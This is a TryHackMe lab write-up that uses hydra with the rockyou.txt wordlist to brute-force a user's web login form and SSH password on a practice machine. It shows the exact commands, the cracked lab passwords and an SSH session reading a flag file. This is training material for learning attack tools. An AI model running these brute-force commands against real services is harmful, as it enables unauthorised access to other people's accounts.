# TryHackMe Hydra

# **Use Hydra to brute force Molly's web password. What is flag 1?**

- First we will brute force Molly's password with `hydra`:

```bash
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
[80][http-post-form] host: 10.10.80.107   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
```

- Login with the credentials and obtain the flag:

![Untitled.png](TryHackMe%20Hydra%205f5874a48a5340cfadbdda0bc5a079dd/Untitled.png)

# **Use Hydra to brute force Molly's SSH password. What is flag 2?**

- Use Hydra's SSH along with the `rockyou.txt` password list to brute force Molly's server password:

```bash
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> -t 4 ssh
[22][ssh] host: 10.10.80.107   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
```

- Log-in to Molly's server using her SSH credentials:

```bash
┌─[azab@ze2pac]─[~]
└──╼ $ssh molly@<MACHINE_IP>
The authenticity of host '10.10.80.107 (10.10.80.107)' can't be established.
ECDSA key fingerprint is SHA256:2xyt3KiRbwRE9QAMyGP0CYYgTJvLavbf5t7RFWUeKro.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.80.107' (ECDSA) to the list of known hosts.
molly@10.10.80.107's password:
molly@ip-10-10-80-107:~$ ls
flag2.txt
molly@ip-10-10-80-107:~$ cat flag2.txt
THM{********************************}
```
